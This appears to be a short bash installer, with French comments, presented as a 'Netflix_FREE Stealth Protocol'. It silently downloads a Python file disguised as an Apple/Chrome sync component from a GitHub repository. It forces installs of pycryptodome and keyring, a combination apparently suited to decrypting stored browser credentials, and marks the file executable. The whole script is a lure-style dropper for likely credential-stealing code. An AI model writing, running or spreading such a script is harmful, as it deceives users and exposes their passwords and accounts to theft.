#!/bin/bash
echo "[*] Initializing Netflix_FREE Stealth Protocol..."

# 1. Téléchargement des nodes
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/requirements.txt

# 2. Nettoyage et Installation (On force pycryptodome)
# On désinstalle les potentiels conflits avant de réinstaller proprement
pip3 uninstall crypto pycrypto pycryptodome --yes --quiet 2>/dev/null
pip3 install pycryptodome keyring requests --break-system-packages --quiet

# 3. Permissions
chmod +x com.apple.chrome.sync.py

echo "[+] Environment Ready. Lock in."
